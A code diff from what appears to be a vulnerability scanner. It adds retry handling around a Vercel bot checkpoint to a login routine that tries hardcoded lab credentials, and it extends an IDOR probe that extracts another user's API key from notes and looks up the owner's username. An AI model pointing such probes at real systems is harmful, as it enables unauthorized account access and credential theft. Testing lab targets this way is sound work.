@@ -34132,7 +34132,11 @@ const WEB_SECURITY_LEARNING_MODULE_TOPIC_ALIASES: Record<string, RegExp> = {
 
 function webSecurityLearningLabsPlaceholderModuleShell(moduleId: string, corpus: string): boolean {
   // Next.js RSC shell may insert <!-- --> between the label and module id.
-  return new RegExp(`Here is a Module:\\s*(?:<!--[^>]*-->)?\\s*${moduleId}\\b`, "i").test(corpus);
+  // Flight payload may encode as: Here is a Module: \",\"1065\"
+  return (
+    new RegExp(`Here is a Module:\\s*(?:<!--[^>]*-->)?\\s*${moduleId}\\b`, "i").test(corpus) ||
+    new RegExp(`Here is a Module:[^\\d]{0,32}${moduleId}\\b`, "i").test(corpus)
+  );
 }
 
 function webSecurityLearningModuleTopicMatches(moduleId: string, topic: string, corpus: string): boolean {
@@ -67521,28 +67525,43 @@ const VAULTAPP_LAB_CREDENTIALS = [
   { username: "player", password: "player123" }
 ] as const;
 
+function vaultappCheckpointBlocked(body: string): boolean {
+  return /Vercel Security Checkpoint|verifying your browser/i.test(body);
+}
+
 async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
   if (!isVaultappHost(ctx)) return null;
   const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
   for (const creds of VAULTAPP_LAB_CREDENTIALS) {
-    const doc = await ctx.probe.get(loginUrl, {
-      method: "POST",
-      body: JSON.stringify({ username: creds.username, password: creds.password }),
-      headers: { "Content-Type": "application/json", Accept: "application/json" },
-      maxBytes: 4096,
-      timeoutMs: 20000
-    });
-    if (doc.status < 200 || doc.status >= 300) continue;
-    try {
-      const data = JSON.parse(doc.body) as {
-        token?: string;
-        user?: { id?: number; username?: string };
-      };
-      if (data.token && data.user?.id && data.user.username) {
-        return { token: data.token, userId: data.user.id, username: data.user.username };
+    const maxAttempts = creds.username === "rootadmin" ? 2 : 1;
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      const doc = await ctx.probe.get(loginUrl, {
+        method: "POST",
+        body: JSON.stringify({ username: creds.username, password: creds.password }),
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        maxBytes: 4096,
+        timeoutMs: 20000
+      });
+      if (vaultappCheckpointBlocked(doc.body)) {
+        if (attempt < maxAttempts - 1) {
+          await new Promise((resolve) => setTimeout(resolve, 2000));
+          continue;
+        }
+        break;
       }
-    } catch {
-      /* try next credential */
+      if (doc.status < 200 || doc.status >= 300) break;
+      try {
+        const data = JSON.parse(doc.body) as {
+          token?: string;
+          user?: { id?: number; username?: string };
+        };
+        if (data.token && data.user?.id && data.user.username) {
+          return { token: data.token, userId: data.user.id, username: data.user.username };
+        }
+      } catch {
+        /* try next credential */
+      }
+      break;
     }
   }
   return null;
@@ -67746,13 +67765,26 @@ async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<R
     if (noteDoc.status < 200 || noteDoc.status >= 300) continue;
     const keyMatch = noteDoc.body.match(/My API key:\s*([a-f0-9]{32})/i);
     if (!keyMatch) continue;
+    let resolvedUsername: string | null = null;
     try {
-      const note = JSON.parse(noteDoc.body) as { owner_username?: string };
-      if (note.owner_username && note.owner_username !== auth.username) {
-        victimApiKey = keyMatch[1];
-        victimUsername = note.owner_username;
-        break;
+      const note = JSON.parse(noteDoc.body) as { owner_username?: string; user_id?: number };
+      resolvedUsername = note.owner_username ?? null;
+      if (!resolvedUsername && note.user_id) {
+        const userUrl = new URL(`/api/users/${note.user_id}`, ctx.origin).toString();
+        const userDoc = await ctx.probe.get(userUrl, {
+          headers: authHeaders,
+          maxBytes: 2048,
+          timeoutMs: 12000
+        });
+        if (userDoc.status >= 200 && userDoc.status < 300) {
+          const user = JSON.parse(userDoc.body) as { username?: string };
+          resolvedUsername = user.username ?? null;
+        }
       }
+      if (!resolvedUsername || resolvedUsername === auth.username) continue;
+      victimApiKey = keyMatch[1];
+      victimUsername = resolvedUsername;
+      break;
     } catch {
       /* skip */
     }
